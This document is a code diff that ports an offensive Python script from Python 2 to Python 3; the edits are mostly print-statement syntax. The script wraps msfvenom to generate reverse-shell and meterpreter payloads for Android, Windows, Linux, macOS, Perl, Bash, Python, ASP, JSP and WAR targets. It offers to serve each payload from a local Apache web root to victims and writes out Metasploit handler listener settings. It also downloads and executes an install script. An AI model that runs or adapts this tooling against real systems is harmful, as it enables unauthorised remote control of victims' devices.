@@ -1,8 +1,15 @@
 #Coded_By_Mohamed_Nour
+from __future__ import print_function
 
 import os
 import sys
 import urllib
+
+try:
+    raw_input          # Python 2
+except NameError:
+    raw_input = input  # Python 3
+
 ##################################
 yes = set(['yes','y', 'ye', 'Y'])
 no = set(['no','n'])
@@ -15,7 +22,7 @@ W = '\033[0m' #white
 ####################  Banner  #######################
 
 def banner():
-    print ("""
+    print("""
 
 %s
 _________ _______  _______  _______ _________ _        _______ _________ _______  _______ 
@@ -58,12 +65,12 @@ List payloads:
 ####################  BANNER  #######################
 
 def msf():
-	print "Do You Want To Install it ? : "
+	print("Do You Want To Install it ? : ")
 	ch = raw_input()
 	if ch in yes :
 		os.system("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall")  
 	else :
-		print "OK BB !"
+		print("OK BB !")
 		sys.exit(0)
 
 
@@ -158,14 +165,14 @@ def android():
 	name  = raw_input("Enter Payload Name: ")
 	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.apk"%(lhost,lport,name))
 	clear()
-	print "Payload Successfuly Generated"
-	print "[1]-Do You Want To Start a listenner"
-	print "[2]-Do You Want To Start an IP Poisener "
+	print("Payload Successfuly Generated")
+	print("[1]-Do You Want To Start a listenner")
+	print("[2]-Do You Want To Start an IP Poisener ")
 	li = raw_input()
 	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.apk /var/www/html'%(name))
-		print "Your IP Successfully Poisened : %s/%s.apk"%(lhost,name)
+		print("Your IP Successfully Poisened : %s/%s.apk"%(lhost,name))
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD android/meterpreter/reverse_tcp
@@ -194,14 +201,14 @@ def windows():
 	name  = raw_input("Enter Payload Name: ")
 	os.system("msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe"%(lhost,lport,name))
 	clear()
-	print "Payload Successfuly Generated"
-	print "[1]-Do You Want To Start a listenner"
-	print "[2]-Do You Want To Start an IP Poisener "
+	print("Payload Successfuly Generated")
+	print("[1]-Do You Want To Start a listenner")
+	print("[2]-Do You Want To Start an IP Poisener ")
 	li = raw_input()
 	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.exe /var/www/html'%(name))
-		print "Your IP Successfully Poisened : %s/%s.exe"%(lhost,name)
+		print("Your IP Successfully Poisened : %s/%s.exe"%(lhost,name))
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD windows/shell/reverse_tcp
@@ -231,14 +238,14 @@ def linux():
 	name  = raw_input("Enter Payload Name: ")
 	os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > %s.elf"%(lhost,lport,name))
 	clear()
-	print "Payload Successfuly Generated"
-	print "[1]-Do You Want To Start a listenner"
-	print "[2]-Do You Want To Start an IP Poisener "
+	print("Payload Successfuly Generated")
+	print("[1]-Do You Want To Start a listenner")
+	print("[2]-Do You Want To Start an IP Poisener ")
 	li = raw_input()
 	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.elf /var/www/html'%(name))
-		print "Your IP Successfully Poisened : %s/%s.elf"%(lhost,name)
+		print("Your IP Successfully Poisened : %s/%s.elf"%(lhost,name))
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD linux/x86/meterpreter/reverse_tcp
@@ -269,14 +276,14 @@ def mac():
 	name  = raw_input("Enter Payload Name: ")
 	os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f macho > %s.macho"%(lhost,lport,name))
 	clear()
-	print "Payload Successfuly Generated"
-	print "[1]-Do You Want To Start a listenner"
-	print "[2]-Do You Want To Start an IP Poisener "
+	print("Payload Successfuly Generated")
+	print("[1]-Do You Want To Start a listenner")
+	print("[2]-Do You Want To Start an IP Poisener ")
 	li = raw_input()
 	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.macho /var/www/html'%(name))
-		print "Your IP Successfully Poisened : %s/%s.macho"%(lhost,name)
+		print("Your IP Successfully Poisened : %s/%s.macho"%(lhost,name))
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD osx/x86/shell_reverse_tcp
@@ -308,14 +315,14 @@ def python():
 	name  = raw_input("Enter Payload Name: ")
 	os.system("msfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw > %s.py"%(lhost,lport,name))
 	clear()
-	print "Payload Successfuly Generated"
-	print "[1]-Do You Want To Start a listenner"
-	print "[2]-Do You Want To Start an IP Poisener "
+	print("Payload Successfuly Generated")
+	print("[1]-Do You Want To Start a listenner")
+	print("[2]-Do You Want To Start an IP Poisener ")
 	li = raw_input()
 	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.py /var/www/html'%(name))
-		print "Your IP Successfully Poisened : %s/%s.py"%(lhost,name)
+		print("Your IP Successfully Poisened : %s/%s.py"%(lhost,name))
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD cmd/unix/reverse_python
@@ -346,14 +353,14 @@ def perl():
 	name  = raw_input("Enter Payload Name: ")
 	os.system("msfvenom -p cmd/unix/reverse_perl LHOST=%s LPORT=%s -f raw > %s.pl"%(lhost,lport,name))
 	clear()
-	print "Payload Successfuly Generated"
-	print "[1]-Do You Want To Start a listenner"
-	print "[2]-Do You Want To Start an IP Poisener "
+	print("Payload Successfuly Generated")
+	print("[1]-Do You Want To Start a listenner")
+	print("[2]-Do You Want To Start an IP Poisener ")
 	li = raw_input()
 	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.pl /var/www/html'%(name))
-		print "Your IP Successfully Poisened : %s/%s.pl"%(lhost,name)
+		print("Your IP Successfully Poisened : %s/%s.pl"%(lhost,name))
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD cmd/unix/reverse_perl
@@ -384,14 +391,14 @@ def bash():
 	name  = raw_input("Enter Payload Name: ")
 	os.system("msfvenom -p cmd/unix/reverse_bash LHOST=%s LPORT=%s -f raw > %s.sh"%(lhost,lport,name))
 	clear()
-	print "Payload Successfuly Generated"
-	print "[1]-Do You Want To Start a listenner"
-	print "[2]-Do You Want To Start an IP Poisener "
+	print("Payload Successfuly Generated")
+	print("[1]-Do You Want To Start a listenner")
+	print("[2]-Do You Want To Start an IP Poisener ")
 	li = raw_input()
 	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.sh /var/www/html'%(name))
-		print "Your IP Successfully Poisened : %s/%s.sh"%(lhost,name)
+		print("Your IP Successfully Poisened : %s/%s.sh"%(lhost,name))
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD cmd/unix/reverse_bash
@@ -420,14 +427,14 @@ def asp():
 	name  = raw_input("Enter Payload Name: ")
 	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f asp > %s.asp"%(lhost,lport,name))
 	clear()
-	print "Payload Successfuly Generated"
-	print "[1]-Do You Want To Start a listenner"
-	print "[2]-Do You Want To Start an IP Poisener "
+	print("Payload Successfuly Generated")
+	print("[1]-Do You Want To Start a listenner")
+	print("[2]-Do You Want To Start an IP Poisener ")
 	li = raw_input()
 	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.asp /var/www/html'%(name))
-		print "Your IP Successfully Poisened : %s/%s.asp"%(lhost,name)
+		print("Your IP Successfully Poisened : %s/%s.asp"%(lhost,name))
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD windows/meterpreter/reverse_tcp
@@ -467,14 +474,14 @@ def jsp():
 	name  = raw_input("Enter Payload Name: ")
 	os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw > %s.jsp"%(lhost,lport,name))
 	clear()
-	print "Payload Successfuly Generated"
-	print "[1]-Do You Want To Start a listenner"
-	print "[2]-Do You Want To Start an IP Poisener "
+	print("Payload Successfuly Generated")
+	print("[1]-Do You Want To Start a listenner")
+	print("[2]-Do You Want To Start an IP Poisener ")
 	li = raw_input()
 	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.jsp /var/www/html'%(name))
-		print "Your IP Successfully Poisened : %s/%s.jsp"%(lhost,name)
+		print("Your IP Successfully Poisened : %s/%s.jsp"%(lhost,name))
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD java/jsp_shell_reverse_tcp
@@ -503,14 +510,14 @@ def war():
 	name  = raw_input("Enter Payload Name: ")
 	os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war > %s.war"%(lhost,lport,name))
 	clear()
-	print "Payload Successfuly Generated"
-	print "[1]-Do You Want To Start a listenner"
-	print "[2]-Do You Want To Start an IP Poisener "
+	print("Payload Successfuly Generated")
+	print("[1]-Do You Want To Start a listenner")
+	print("[2]-Do You Want To Start an IP Poisener ")
 	li = raw_input()
 	if li == '2' :
 		os.system('sudo service apache2 start')
 		os.system('sudo cp %s.war /var/www/html'%(name))
-		print "Your IP Successfully Poisened : %s/%s.war"%(lhost,name)
+		print("Your IP Successfully Poisened : %s/%s.war"%(lhost,name))
 		listen = """
 		use exploit/multi/handler
 		set PAYLOAD java/jsp_shell_reverse_tcp
